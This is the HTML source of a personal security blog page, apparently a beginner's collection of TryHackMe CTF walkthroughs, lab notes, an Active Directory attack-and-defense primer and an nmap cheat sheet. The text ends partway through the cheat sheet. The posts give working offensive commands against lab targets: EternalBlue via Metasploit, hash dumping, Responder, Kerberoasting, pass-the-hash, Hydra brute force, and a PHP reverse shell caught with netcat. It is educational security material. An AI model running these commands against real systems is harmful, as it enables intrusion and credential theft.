@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blog / Writeups — Brandon Sweat</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --bg:#0d0d0d; --bg2:#111; --fg:#eeeae2; --muted:#9a9490; --green:#1ec776; --green-glow:rgba(30,199,118,0.3); --accent:#c0392b; --border:#1e1e1e; --border2:#2a2a2a; }
+    body { background:var(--bg); color:var(--fg); font-family:'JetBrains Mono',monospace; min-height:100vh; overflow-x:hidden; }
+
+    /* TOP NAV */
+    .top-nav { display:flex; align-items:center; justify-content:space-between; padding:22px 52px; border-bottom:1px solid var(--border); }
+    .breadcrumb { display:flex; align-items:center; gap:8px; font-size:0.78rem; }
+    .back-link { color:var(--muted); text-decoration:none; transition:color 0.15s; }
+    .back-link:hover { color:var(--green); }
+    .sep { color:var(--border2); }
+    .current-page { color:var(--fg); font-weight:500; }
+    .nav-right { font-size:0.63rem; color:var(--muted); }
+
+    /* FOLDER STRIP */
+    .folder-strip { display:flex; gap:0; padding:10px 44px; border-bottom:1px solid var(--border); overflow-x:auto; scrollbar-width:none; }
+    .folder-strip::-webkit-scrollbar { display:none; }
+    .fstrip-item { display:flex; flex-direction:column; align-items:center; gap:5px; text-decoration:none; color:var(--muted); padding:6px 10px; transition:color 0.15s; min-width:56px; position:relative; }
+    .fstrip-item::after { content:''; position:absolute; bottom:0; left:10px; right:10px; height:1px; background:var(--green); transform:scaleX(0); transition:transform 0.2s; }
+    .fstrip-item:hover { color:var(--fg); }
+    .fstrip-item.active { color:var(--green); }
+    .fstrip-item.active::after { transform:scaleX(1); }
+    .fstrip-svg { width:40px; height:32px; }
+    .fstrip-label { font-size:0.52rem; letter-spacing:0.07em; text-transform:uppercase; text-align:center; white-space:nowrap; line-height:1.3; }
+
+    /* CONTENT */
+    .content { padding:44px 52px; max-width:900px; margin:0 auto; }
+    .page-header { margin-bottom:36px; }
+    .page-title { font-size:1.5rem; font-weight:700; letter-spacing:-0.02em; margin-bottom:8px; }
+    .page-subtitle { font-size:0.73rem; color:var(--muted); }
+
+    /* FILTERS */
+    .filters { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:32px; }
+    .filter-btn { font-family:inherit; font-size:0.62rem; letter-spacing:0.08em; text-transform:uppercase; padding:5px 12px; border-radius:1px; border:1px solid var(--border2); background:transparent; color:var(--muted); cursor:pointer; transition:all 0.15s; }
+    .filter-btn:hover, .filter-btn.active { border-color:var(--green); color:var(--green); background:rgba(30,199,118,0.06); }
+
+    /* POST CARDS */
+    .post-list { display:flex; flex-direction:column; }
+    .post-card { display:grid; grid-template-columns:100px 1fr auto; align-items:start; gap:24px; padding:22px 0; border-bottom:1px solid var(--border); cursor:pointer; color:var(--fg); }
+    .post-card:first-child { border-top:1px solid var(--border); }
+    .post-card:hover .post-title { color:var(--green); }
+    .post-date { font-size:0.65rem; color:var(--muted); padding-top:2px; }
+    .post-meta { display:flex; flex-direction:column; gap:6px; }
+    .post-title { font-size:0.88rem; font-weight:500; line-height:1.4; transition:color 0.15s; }
+    .post-excerpt { font-size:0.7rem; color:var(--muted); line-height:1.7; font-style:italic; }
+    .post-tags { display:flex; gap:5px; flex-wrap:wrap; margin-top:2px; }
+    .tag { font-size:0.58rem; letter-spacing:0.07em; text-transform:uppercase; padding:2px 7px; border:1px solid var(--border2); color:var(--muted); }
+    .tag.ctf { border-color:var(--accent); color:var(--accent); }
+    .tag.security { border-color:var(--green); color:var(--green); }
+    .post-arrow { font-size:0.75rem; color:var(--muted); padding-top:2px; transition:color 0.15s, transform 0.15s; }
+    .post-card:hover .post-arrow { color:var(--green); transform:translateX(3px); }
+
+    .wip-note { margin-top:44px; padding:18px 22px; border:1px dashed var(--border2); font-size:0.7rem; color:var(--muted); line-height:1.9; }
+    .wip-note span { color:var(--green); }
+    .wip-note a { color:var(--green); text-decoration:none; }
+
+    /* ── ARTICLE OVERLAY ──────────────────────────────────────────── */
+    .article-overlay {
+      position: fixed;
+      inset: 0;
+      background: var(--bg);
+      z-index: 50;
+      overflow-y: auto;
+      transform: translateX(100%);
+      transition: transform 0.32s cubic-bezier(.25,.8,.25,1);
+    }
+    .article-overlay.open { transform: translateX(0); }
+
+    .article-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 22px 52px;
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      background: var(--bg);
+      z-index: 10;
+    }
+    .article-back {
+      font-size: 0.78rem;
+      color: var(--muted);
+      background: none;
+      border: none;
+      font-family: inherit;
+      cursor: pointer;
+      transition: color 0.15s;
+      padding: 0;
+    }
+    .article-back:hover { color: var(--green); }
+    .article-date-nav { font-size: 0.63rem; color: var(--muted); }
+
+    .article-body {
+      padding: 52px 52px 80px;
+      max-width: 760px;
+      margin: 0 auto;
+    }
+
+    .article-kicker { font-size:0.6rem; color:var(--green); letter-spacing:0.14em; text-transform:uppercase; margin-bottom:14px; }
+    .article-title { font-size: clamp(1.2rem, 3vw, 1.9rem); font-weight:700; letter-spacing:-0.025em; line-height:1.2; margin-bottom:18px; }
+    .article-tags { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:36px; padding-bottom:36px; border-bottom:1px solid var(--border); }
+
+    /* Article prose */
+    .prose h2 { font-size:0.88rem; font-weight:700; color:var(--green); letter-spacing:0.06em; text-transform:uppercase; margin:36px 0 14px; }
+    .prose h3 { font-size:0.82rem; font-weight:600; margin:24px 0 10px; }
+    .prose p { font-size:0.76rem; color:var(--muted); line-height:2; margin-bottom:16px; }
+    .prose p em { color:var(--fg); font-style:normal; font-weight:500; }
+    .prose a { color:var(--green); text-decoration:none; }
+    .prose a:hover { text-decoration:underline; }
+    .prose ul { list-style:none; margin-bottom:16px; }
+    .prose ul li { font-size:0.76rem; color:var(--muted); line-height:1.9; padding-left:16px; position:relative; }
+    .prose ul li::before { content:'→'; position:absolute; left:0; color:var(--green); font-size:0.65rem; }
+    .prose pre {
+      background: #060606;
+      border: 1px solid var(--border2);
+      border-left: 2px solid var(--green);
+      padding: 18px 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+      font-size: 0.7rem;
+      color: #b8f5d4;
+      line-height: 1.85;
+    }
+    .prose .note {
+      border: 1px dashed var(--border2);
+      padding: 14px 18px;
+      margin: 20px 0;
+      font-size: 0.7rem;
+      color: var(--muted);
+      line-height: 1.85;
+    }
+    .prose .note strong { color: var(--green); }
+
+    .page-wrap { max-width: 1400px; margin: 0 auto; }
+
+    @media (max-width:640px) {
+      .top-nav, .content { padding-left:24px; padding-right:24px; }
+      .folder-strip { padding-left:16px; padding-right:16px; }
+      .post-card { grid-template-columns:1fr; gap:6px; }
+      .post-arrow { display:none; }
+      .article-nav, .article-body { padding-left:24px; padding-right:24px; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="top-nav">
+  <div class="breadcrumb">
+    <a href="index.html" class="back-link">← Brandon Sweat</a>
+    <span class="sep">/</span>
+    <span class="current-page">Blog / Writeups</span>
+  </div>
+  <span class="nav-right">// knowledge base</span>
+</nav>
+
+<div class="folder-strip" id="folder-strip"></div>
+
+<div class="page-wrap">
+
+<main class="content">
+  <header class="page-header">
+    <h1 class="page-title">Blog &amp; Writeups</h1>
+    <p class="page-subtitle">Security research, CTF solutions, tool notes, and other things I've learned.</p>
+  </header>
+
+  <div class="filters">
+    <button class="filter-btn active" onclick="filterPosts('all',this)">All</button>
+    <button class="filter-btn" onclick="filterPosts('security',this)">Security</button>
+    <button class="filter-btn" onclick="filterPosts('ctf',this)">CTF</button>
+    <button class="filter-btn" onclick="filterPosts('tools',this)">Tools &amp; Lab</button>
+    <button class="filter-btn" onclick="filterPosts('general',this)">General</button>
+  </div>
+
+  <div class="post-list" id="post-list"></div>
+
+  <div class="wip-note">
+    <span>// more writeups incoming</span> — updates as I work through new rooms, research, and projects.<br>
+    Topic request? <a href="mailto:brandonsweat@proton.me">brandonsweat@proton.me</a>
+  </div>
+</main>
+
+<!-- ── ARTICLE OVERLAY ─────────────────────────────────────────────── -->
+<div class="article-overlay" id="article-overlay">
+  <nav class="article-nav">
+    <button class="article-back" onclick="closeArticle()">← Back to posts</button>
+    <span class="article-date-nav" id="article-date-nav"></span>
+  </nav>
+  <div class="article-body">
+    <p class="article-kicker" id="article-kicker"></p>
+    <h1 class="article-title" id="article-title"></h1>
+    <div class="article-tags" id="article-tags"></div>
+    <div class="prose" id="article-prose"></div>
+  </div>
+</div>
+
+</div><!-- /.page-wrap -->
+
+<script>
+  // ── POST DATA ─────────────────────────────────────────────────────────────
+  const posts = [
+    {
+      id: 7,
+      date: 'Apr 2026',
+      title: 'TryHackMe: OhSINT — Open-Source Intelligence Walkthrough',
+      excerpt: 'A Windows XP wallpaper with hidden EXIF data kicks off a chain of OSINT discoveries across Twitter, GitHub, Wigle.net, and WordPress. Also I got the flag and then typo\'d it. Heartbreaking.',
+      tags: 'ctf security',
+      tagHTML: '<span class="tag ctf">CTF</span><span class="tag security">OSINT</span><span class="tag">TryHackMe</span>',
+      kicker: '// TryHackMe · OSINT Writeup',
+      body: `
+        <div class="note"><strong>// Spoiler Warning:</strong> This writeup covers the full solution to TryHackMe's OhSINT room, including anything connected to the GitHub <em>OWoodfl1nt</em> and Twitter <em>@OWoodflint</em>. Stop here if you want to try it yourself first. Also let the record show I finished this room correctly the first time and then typo'd the final flag. Heartbreaking.</div>
+
+        <h2>Overview</h2>
+        <p>OhSINT is TryHackMe's introductory OSINT room. You're given a single image file — a screenshot of the Windows XP default desktop — and tasked with extracting seven pieces of information about a person using only open-source intelligence techniques. No exploitation, no brute force. Just Google, some metadata tools, and a willingness to click around.</p>
+
+        <h2>Step 1 — Pull the EXIF Metadata</h2>
+        <p>The image itself looks completely boring. That's the point. The real content is in the metadata baked into the file. Running it through <em>exif.tools</em> (or <code>exiftool</code> on the command line) reveals a useful payload:</p>
+        <pre>exiftool WindowsXP.jpg</pre>
+        <p>Key fields that came back:</p>
+        <ul>
+          <li><em>Copyright:</em> OWoodflint</li>
+          <li><em>GPS Latitude / Longitude:</em> coordinates embedded in the image</li>
+          <li>Encoding software and a few other fields</li>
+        </ul>
+        <p>The coordinates initially looked promising. They came back in a non-standard format, which seemed to point toward a major city. I tried the obvious answers — the city itself, then a specific neighborhood — both missed. Reformatting the coordinates pointed me somewhere else entirely, and the nearest big city to those coordinates also missed. Lesson: don't anchor too hard on coordinates when other leads are available. Move on.</p>
+
+        <h2>Step 2 — Google the Copyright Holder</h2>
+        <p>The copyright field said <em>OWoodflint</em>. That's not a common name. Dropping it into Google surfaced three results at the top of the first page: a Twitter account, a WordPress site, and a GitHub profile. Hitting the top of the SEO like that is a dead giveaway in a CTF — open all three.</p>
+
+        <h2>Step 3 — Twitter → BSSID</h2>
+        <p>The Twitter account had a tweet containing a <em>BSSID</em> (a hardware identifier for a specific wireless access point). Easy flag. One down.</p>
+
+        <h2>Step 4 — Wigle.net → City + SSID</h2>
+        <p>With the BSSID in hand, I plugged it into <em>Wigle.net</em> — a crowd-sourced database that maps wireless networks across the world. Wigle had that BSSID on file, pinned to a network in <em>London</em>, and returned the SSID of the access point as well. Two more flags knocked out in one lookup.</p>
+
+        <h2>Step 5 — GitHub → Email Address</h2>
+        <p>The GitHub profile had an About Me section with his <em>email address</em> sitting right there in plain text. Flag.</p>
+
+        <h2>Step 6 — WordPress → Vacation City</h2>
+        <p>His WordPress page mentioned the city he was currently on vacation in. Another flag, right on the surface.</p>
+
+        <h2>Step 7 — The Password (The Hard One)</h2>
+        <p>Finding the password was the only part that actually required digging. My first instinct was to look for exploitable vulnerabilities in WordPress — which, fair, there are plenty — but that felt like the wrong layer for a beginner OSINT room. I pulled back and started closer to the surface.</p>
+        <ul>
+          <li>Checked the GitHub commit history for the page — looking for anything posted in plaintext and then deleted. Nothing useful.</li>
+          <li>Went back through his Twitter history and bio. No hits.</li>
+          <li>Returned to Google with the "OWoodflint" query and paged through the results.</li>
+        </ul>
+        <p>A few pages in, the WordPress site came up under a different URL index than before. The Google preview snippet showed a sentence I hadn't seen on the page — something involving pennies. I opened the page, then <em>Ctrl+F'd the source</em> for that text. It was there — hidden in the page's source as white text on a white background, invisible unless you're actively looking for it.</p>
+        <pre>Ctrl+U  →  Ctrl+F  →  search for the snippet from Google's preview</pre>
+        <p>Copied the full string, pasted it as the flag. It hit. What a silly problem.</p>
+        <p>And then I typo'd it on submission. The room still counts it as a solve but the personal record shows a red mark that will haunt me.</p>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+          <li>EXIF metadata is real and routinely overlooked. Strip it from anything you publish publicly if you care about location privacy.</li>
+          <li>A unique username across multiple platforms is an OSINT goldmine — one search and you've mapped someone's entire internet presence.</li>
+          <li>Wigle.net is a genuinely powerful tool. The sheer coverage of its wireless network database is remarkable (and a little unsettling).</li>
+          <li>Hidden text in page source (white-on-white, zero-opacity, off-screen) is a real technique for both CTF flag hiding and malicious content obfuscation. Always worth checking the source when you're stuck.</li>
+          <li>Don't start at the exploit layer. The answer is almost always in the content first.</li>
+        </ul>
+      `
+    },
+    {
+      id: 6,
+      date: 'Apr 2026',
+      title: 'OpenVAS on Metasploitable — My First Vulnerability Scan',
+      excerpt: 'Standing up OpenVAS by Greenbone in a VirtualBox lab, running a full scan against Metasploitable, and digging into CVE-2011-3556 — an RCE in Java RMI that takes five commands to exploit.',
+      tags: 'security tools',
+      tagHTML: '<span class="tag security">Vuln Scan</span><span class="tag">OpenVAS</span><span class="tag">Lab</span>',
+      kicker: '// Vulnerability Scanning · HomeLab',
+      body: `
+        <h2>Overview</h2>
+        <p>I wanted hands-on experience with a real vulnerability scanner rather than just reading about them, and <em>OpenVAS by Greenbone</em> kept coming up as the go-to open-source option. So I set up a small VirtualBox lab, pointed it at a deliberately broken target, and let it rip. Here's what I found — and what I learned.</p>
+
+        <h2>Lab Setup</h2>
+        <p>The environment was straightforward: two VMs on an isolated virtual network inside VirtualBox.</p>
+        <ul>
+          <li><em>Kali Linux</em> — attacker machine, running OpenVAS (Greenbone Community Edition)</li>
+          <li><em>Metasploitable 2</em> — the intentionally vulnerable target</li>
+        </ul>
+        <p>After getting both machines updated and able to reach each other, I confirmed connectivity with a quick ping and moved on to recon.</p>
+
+        <h2>Reconnaissance</h2>
+        <p>Nmapping Metasploitable is always humbling — it returns a wall of open ports that would give any sysadmin a headache:</p>
+        <pre>nmap -sV -sC --open &lt;TARGET_IP&gt;</pre>
+        <p>The output confirmed the target was alive, listening on dozens of ports, and very much vulnerable. With a solid picture of the attack surface, it was time to hand things off to the scanner.</p>
+
+        <h2>Running the Scan</h2>
+        <p>In the OpenVAS web UI (accessible at <em>https://localhost:9392</em>), I created a new task targeting Metasploitable's IP and selected the <em>Full and Fast</em> scan configuration — the broadest standard option, which tests all ports and runs the full NVT plugin library against the findings.</p>
+        <p>The scan ran for about <em>15 minutes</em>, methodically working through every open port. The full report is linked below.</p>
+        <p><a href="documents/metasploitableReport.pdf" target="_blank">→ View the OpenVAS scan report (PDF)</a></p>
+
+        <h2>Results: 23 High-Severity Findings</h2>
+        <p>The idea of having to remediate a network this bad is genuinely overwhelming. OpenVAS surfaced <em>23 "High" severity vulnerabilities</em>, plus a longer tail of mediums and lows. The good news: roughly half of the criticals have straightforward fixes.</p>
+        <ul>
+          <li>Outdated services with known CVEs → <em>update from vendor</em></li>
+          <li>Default credentials still active (admin:admin, postgres:postgres) → <em>change immediately</em></li>
+          <li>Unnecessary services exposed → <em>disable or replace with a safer alternative</em></li>
+        </ul>
+        <p>Many of these are easy to verify after remediation — patch a service, confirm the old credentials fail, mark it closed. The screaming red flags are often the easiest to eliminate once you know what you're looking for.</p>
+
+        <h2>Deep Dive: CVE-2011-3556 — Java RMI RCE</h2>
+        <p>One finding stood out: <em>CVE-2011-3556</em>, a weakness in Java's Remote Method Invocation (RMI) registry. This one earns its severity — it allows an attacker to achieve <em>remote code execution via server-side request forgery</em> by deserializing a crafted payload against the RMI registry.</p>
+        <p>The attack chain is almost offensively simple:</p>
+        <pre># 1. Deserialize the RMI registry with a crafted payload (e.g. AnTrinh's)
+# 2. Open a listener for the incoming RMI connection
+nc -lvnp 4444
+# 3. Open a listener for the reverse shell
+nc -lvnp 4445
+# 4. Send the payload to the remote RMI service
+# 5. Catch the shell</pre>
+        <p>Five commands. Remote code execution on a fairly common, often-misconfigured service with millions of Java deployments in the wild.</p>
+        <p>What makes this particularly frustrating from a remediation standpoint is that <em>a simple update isn't enough</em>. The fix requires a redeployment of the service with class-loading disabled — not just a patch. That's a meaningful operational cost, which is probably why this vulnerability lingered so long.</p>
+        <div class="note"><strong>// Credit:</strong> Thanks to <a href="https://blog.tneitzel.eu/" target="_blank">Tobias Neitzel</a> for the detailed writeup on CVE-2011-3556 that made this exploitation chain click.</div>
+
+        <h2>Takeaways</h2>
+        <ul>
+          <li>OpenVAS is genuinely powerful for a free tool — the NVT coverage is broad and the HTML/PDF reports are clear enough to act on directly.</li>
+          <li>Default credentials and unpatched services remain the low-hanging fruit in almost every environment. They showed up here constantly.</li>
+          <li>Not every "High" severity finding has the same remediation complexity. Triage by fix effort, not just severity score.</li>
+          <li>CVE-2011-3556 is a good reminder that some vulnerabilities require architectural fixes, not just patches — and those are the ones that tend to stay open longest.</li>
+        </ul>
+      `
+    },
+    {
+      id: 0,
+      date: 'Apr 2025',
+      title: 'TryHackMe: Blue — EternalBlue Exploitation Walkthrough',
+      excerpt: 'Step-by-step exploitation of MS17-010 using Metasploit, followed by post-exploitation enumeration and privilege escalation on Windows 7.',
+      tags: 'ctf security',
+      tagHTML: '<span class="tag ctf">CTF</span><span class="tag security">Exploit</span><span class="tag">Windows</span>',
+      kicker: '// TryHackMe · CTF Writeup',
+      body: `
+        <h2>Overview</h2>
+        <p>Blue is a beginner-level TryHackMe room that walks you through exploiting <em>MS17-010 (EternalBlue)</em> — the vulnerability behind the WannaCry ransomware outbreak. The target is a Windows 7 machine with SMB exposed. This writeup covers recon, exploitation, and post-exploitation from start to finish.</p>
+
+        <h2>Reconnaissance</h2>
+        <p>Start with an nmap scan to identify open ports and services:</p>
+        <pre>nmap -sV -sC -p- --min-rate 5000 &lt;TARGET_IP&gt;</pre>
+        <p>Key findings: ports 135, 139, and 445 open (SMB), Windows 7 identified. Run the vuln script to confirm MS17-010:</p>
+        <pre>nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;</pre>
+        <p>Output should show <em>VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1</em>. That's our entry point.</p>
+
+        <h2>Exploitation</h2>
+        <p>Fire up Metasploit and load the EternalBlue module:</p>
+        <pre>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS &lt;TARGET_IP&gt;
+set LHOST &lt;YOUR_IP&gt;
+run</pre>
+        <p>If the shell drops, background it with <em>Ctrl+Z</em> and upgrade to Meterpreter:</p>
+        <pre>use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+run</pre>
+
+        <h2>Post-Exploitation</h2>
+        <p>With a Meterpreter session open, check your privilege level — you should already be SYSTEM:</p>
+        <pre>getuid
+# Server username: NT AUTHORITY\SYSTEM</pre>
+        <p>Dump password hashes from the SAM database:</p>
+        <pre>hashdump</pre>
+        <p>Crack the hashes offline with John or pass them directly. The room flags are hidden in common locations — check user desktops and the root of C:\\.</p>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+          <li>SMBv1 should be disabled on every Windows machine in your environment — no exceptions.</li>
+          <li>MS17-010 is still found in the wild on unpatched legacy systems. It's a critical patch to verify in any audit.</li>
+          <li>EternalBlue gives you SYSTEM immediately — no privilege escalation step needed, which is what makes it so dangerous.</li>
+        </ul>
+        <div class="note"><strong>// Note:</strong> This walkthrough is for educational purposes on a controlled lab environment. Never run these tools against systems you don't own or have explicit written permission to test.</div>
+      `
+    },
+    {
+      id: 1,
+      date: 'Mar 2025',
+      title: 'Building a Home Security Lab on a Budget',
+      excerpt: 'How I set up a functional pentesting lab using Proxmox, pfSense, and vulnerable VMs — total cost under $200.',
+      tags: 'tools general',
+      tagHTML: '<span class="tag">HomeLab</span><span class="tag">Proxmox</span><span class="tag">Networking</span>',
+      kicker: '// Lab Setup · HomeLab',
+      body: `
+        <h2>Why Build a Home Lab?</h2>
+        <p>Practicing on TryHackMe and HackTheBox is great, but having your own lab lets you break things, rebuild them, and get hands-on with real enterprise configurations — Active Directory, network segmentation, firewall rules — without paying for cloud time or worrying about scope.</p>
+        <p>Total hardware cost for my setup: <em>under $200</em>, built around a used mini PC from eBay.</p>
+
+        <h2>Hardware</h2>
+        <ul>
+          <li><em>Mini PC (Beelink / HP EliteDesk)</em> — 16GB RAM, 256GB SSD. Used on eBay for ~$120. This runs Proxmox as the hypervisor.</li>
+          <li><em>Network switch</em> — cheap unmanaged 5-port switch for VLAN testing (~$15).</li>
+          <li>Your existing router is fine for now. pfSense will handle internal segmentation.</li>
+        </ul>
+
+        <h2>Proxmox Setup</h2>
+        <p>Proxmox is a free, open-source hypervisor that runs on bare metal. Download the ISO from proxmox.com and flash it to a USB drive with Balena Etcher. Boot from USB and follow the installer — it's straightforward.</p>
+        <p>Once installed, access the web UI at <em>https://&lt;proxmox-ip&gt;:8006</em> from another machine on your network.</p>
+
+        <h2>Network Architecture</h2>
+        <p>The goal is isolated segments so your attack machine can't accidentally reach your real network:</p>
+        <ul>
+          <li><em>vmbr0</em> — bridged to your physical NIC, internet-facing</li>
+          <li><em>vmbr1</em> — isolated internal lab network (no physical uplink)</li>
+          <li>pfSense VM sits between both bridges acting as the firewall/router</li>
+        </ul>
+        <pre># Proxmox network config snippet (/etc/network/interfaces)
+auto vmbr1
+iface vmbr1 inet static
+    address 10.10.10.1/24
+    bridge-ports none
+    bridge-stp off
+    bridge-fd 0</pre>
+
+        <h2>VMs Running in My Lab</h2>
+        <ul>
+          <li><em>Kali Linux</em> — primary attack machine</li>
+          <li><em>Windows Server 2019</em> — Active Directory domain controller</li>
+          <li><em>Windows 10</em> — domain-joined workstation for lateral movement practice</li>
+          <li><em>Metasploitable 3</em> — intentionally vulnerable Linux/Windows targets</li>
+          <li><em>pfSense</em> — firewall, DHCP, DNS for the lab segment</li>
+        </ul>
+
+        <h2>What I Practice In It</h2>
+        <ul>
+          <li>AD attack chains: LLMNR poisoning, Kerberoasting, Pass-the-Hash</li>
+          <li>Network scanning and service enumeration</li>
+          <li>Privilege escalation on Windows and Linux</li>
+          <li>Firewall rule testing and network traffic analysis with Wireshark</li>
+        </ul>
+        <div class="note"><strong>// Tip:</strong> Take Proxmox snapshots before and after major changes. Being able to roll back in seconds is one of the biggest advantages of a virtualized lab.</div>
+      `
+    },
+    {
+      id: 2,
+      date: 'Feb 2025',
+      title: 'Active Directory 101: Attacks and Defenses for Beginners',
+      excerpt: 'Common AD misconfigurations — Kerberoasting, Pass-the-Hash, LLMNR poisoning — explained from an offensive and defensive lens.',
+      tags: 'security',
+      tagHTML: '<span class="tag security">Security</span><span class="tag">Active Directory</span><span class="tag">Windows</span>',
+      kicker: '// Security Concepts · Active Directory',
+      body: `
+        <h2>Why Active Directory Matters</h2>
+        <p>Active Directory is the identity backbone of most corporate Windows environments. It manages users, computers, groups, and policies across an organization. From an attacker's perspective, <em>compromising AD means compromising everything</em>. Understanding how it gets abused is essential whether you're on offense or defense.</p>
+
+        <h2>LLMNR Poisoning</h2>
+        <p>LLMNR (Link-Local Multicast Name Resolution) is a protocol Windows uses when DNS fails. If a machine tries to resolve a hostname that doesn't exist, it broadcasts a request to the entire network. An attacker listening on the network can respond first, capturing the victim's <em>NTLMv2 hash</em>.</p>
+        <p>Tool: <em>Responder</em></p>
+        <pre>sudo python3 Responder.py -I eth0 -wv</pre>
+        <p>Crack the captured hash offline with Hashcat:</p>
+        <pre>hashcat -m 5600 captured.txt /usr/share/wordlists/rockyou.txt</pre>
+        <p><em>Defense:</em> Disable LLMNR and NBT-NS via Group Policy. If you don't use them, there's no reason to leave them on.</p>
+
+        <h2>Kerberoasting</h2>
+        <p>Any authenticated domain user can request a Kerberos service ticket for any Service Principal Name (SPN). That ticket is encrypted with the service account's password hash — which means you can take it offline and crack it.</p>
+        <pre># Request all SPNs with Impacket
+GetUserSPNs.py domain/user:password -dc-ip &lt;DC_IP&gt; -request</pre>
+        <p>Then crack with Hashcat (-m 13100 for Kerberoast hashes).</p>
+        <p><em>Defense:</em> Use strong, random passwords (25+ chars) on service accounts. Audit SPNs regularly — any account with one is a target.</p>
+
+        <h2>Pass-the-Hash</h2>
+        <p>Windows often stores NTLM hashes in memory. If you've compromised one machine and dumped hashes, you can use those hashes directly to authenticate to other machines — <em>no password cracking needed</em>.</p>
+        <pre># With CrackMapExec
+crackmapexec smb &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;</pre>
+        <p><em>Defense:</em> Enable Protected Users security group for privileged accounts. Implement Credential Guard on Windows 10+ endpoints to prevent LSASS memory dumps.</p>
+
+        <h2>Quick Reference: Tools for AD Attacks</h2>
+        <ul>
+          <li><em>BloodHound</em> — maps AD relationships and finds attack paths to Domain Admin</li>
+          <li><em>Impacket</em> — Python toolkit for SMB, Kerberos, and LDAP attacks</li>
+          <li><em>CrackMapExec</em> — Swiss army knife for network-wide SMB/AD enumeration</li>
+          <li><em>Mimikatz</em> — credential dumping from Windows memory (LSASS)</li>
+          <li><em>Responder</em> — LLMNR/NBT-NS poisoning and hash capture</li>
+        </ul>
+      `
+    },
+    {
+      id: 3,
+      date: 'Jan 2025',
+      title: 'TryHackMe: Mr. Robot CTF — Full Walkthrough',
+      excerpt: 'All three flags via web enumeration, Hydra brute force, and GTFObins privilege escalation through nmap SUID.',
+      tags: 'ctf',
+      tagHTML: '<span class="tag ctf">CTF</span><span class="tag">Linux</span><span class="tag">Web</span>',
+      kicker: '// TryHackMe · CTF Writeup',
+      body: `
+        <h2>Overview</h2>
+        <p>Mr. Robot is a medium-difficulty TryHackMe room themed around the TV show. There are three flags hidden on the machine. It involves web enumeration, brute-forcing a WordPress login, and a classic SUID privilege escalation via nmap's interactive mode.</p>
+
+        <h2>Flag 1 — robots.txt</h2>
+        <p>Start with an nmap scan to find open ports (80 and 443 — web only). Browse to the site and check <em>robots.txt</em> right away — it's always worth checking:</p>
+        <pre>http://&lt;TARGET_IP&gt;/robots.txt</pre>
+        <p>You'll find two entries: the first flag file and a dictionary file called <em>fsocity.dic</em>. Download both. Flag 1 is plaintext in the flag file.</p>
+
+        <h2>Flag 2 — WordPress Brute Force</h2>
+        <p>Gobuster reveals a WordPress install at /wp-login. The dictionary from robots.txt is our wordlist. First, find the username by trying the login form — WordPress helpfully tells you if a username is valid. The username is <em>elliot</em>.</p>
+        <p>Sort and deduplicate the wordlist, then brute force with Hydra:</p>
+        <pre>sort -u fsocity.dic > fsocity-clean.dic
+hydra -l elliot -P fsocity-clean.dic &lt;TARGET_IP&gt; http-post-form \
+  "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"</pre>
+        <p>Once in, upload a PHP reverse shell via the theme editor (Appearance → Editor → 404 template). Trigger it by navigating to a 404 URL. Catch the shell with netcat:</p>
+        <pre>nc -lvnp 4444</pre>
+        <p>Flag 2 is in /home/robot/ but owned by the robot user — it's readable once you pivot to that account. The robot user's password hash is in the same directory; crack it with John.</p>
+
+        <h2>Flag 3 — SUID Privilege Escalation</h2>
+        <p>Find SUID binaries on the system:</p>
+        <pre>find / -perm -u=s -type f 2>/dev/null</pre>
+        <p>nmap shows up — and an older version of nmap has an <em>interactive mode</em> that can spawn a shell:</p>
+        <pre>nmap --interactive
+nmap> !sh
+whoami
+# root</pre>
+        <p>Flag 3 is in /root/. Game over.</p>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+          <li>Always check robots.txt — CTF designers love hiding things in plain sight.</li>
+          <li>WordPress is a common attack surface in real engagements. Brute-force protections are often misconfigured or absent.</li>
+          <li>SUID misconfigurations are one of the most common Linux privilege escalation vectors. <em>GTFObins</em> is your reference for exploiting them.</li>
+        </ul>
+      `
+    },
+    {
+      id: 4,
+      date: 'Dec 2024',
+      title: 'Nmap Cheat Sheet: The Scans I Actually Use',
+      excerpt: 'Moving past -sV and -A — practical nmap flags, NSE scripts, and timing options for real engagements and CTFs.',
+      tags: 'tools',
+      tagHTML: '<span class="tag">Tools</span><span class="tag">Nmap</span><span class="tag">Recon</span>',
+      kicker: '// Tools & Reference · Nmap',
+      body: `
+        <h2>The Basics (That Everyone Knows)</h2>
+        <pre># Service version detection + default scripts
+nmap -sV -sC &lt;TARGET&gt;
+
+# Aggressive scan (OS detection, version, scripts, traceroute)
+nmap -A &lt;TARGET&gt;</pre>
+        <p>These are fine for learning but slow in practice. Here's what I actually reach for.</p>
+
+        <h2>My Go-To Initial Scan</h2>
+        <p>Fast full-port scan first, then detailed scan on what's open:</p>
+        <pre># Step 1 — find all open ports quickly
+nmap -p- --min-rate 5000 -T4 &lt;TARGET&gt; -oN ports.txt
+
+# Step 2 — detailed scan on discovered ports only
+nmap -sV -sC -p 22,80,443,8080 &lt;TARGET&gt; -oN detailed.txt</pre>
+        <p>Running -p- with --min-rate 5000 hits all 65535 ports fast. Then you do the slow, thorough scan only on ports that are actually open. Saves significant time.</p>
+
+        <h2>Useful Flags I Reach For Often</h2>
+        <ul>
+          <li><em>-sU</em> — UDP scan. Often skipped, but DNS (53), SNMP (161), and TFTP (69) only show up here.</li>
